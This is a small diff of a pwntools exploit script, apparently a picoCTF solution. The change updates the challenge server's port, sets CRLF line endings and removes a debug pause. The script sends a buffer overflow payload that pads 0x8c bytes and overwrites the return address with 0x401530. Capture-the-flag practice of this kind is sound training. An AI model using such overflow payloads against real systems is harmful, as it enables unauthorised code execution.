@@ -1,10 +1,9 @@
 from pwn import *
 
-r = remote("saturn.picoctf.net", 50417)
+r = remote("saturn.picoctf.net", 53396)
 # r = process("./vuln.exe")
 r.recvline()
-
-raw_input()
+context.newline = b'\r\n'
 payload = b'a'*0x8c + p32(0x401530)
 r.sendline(payload)
 
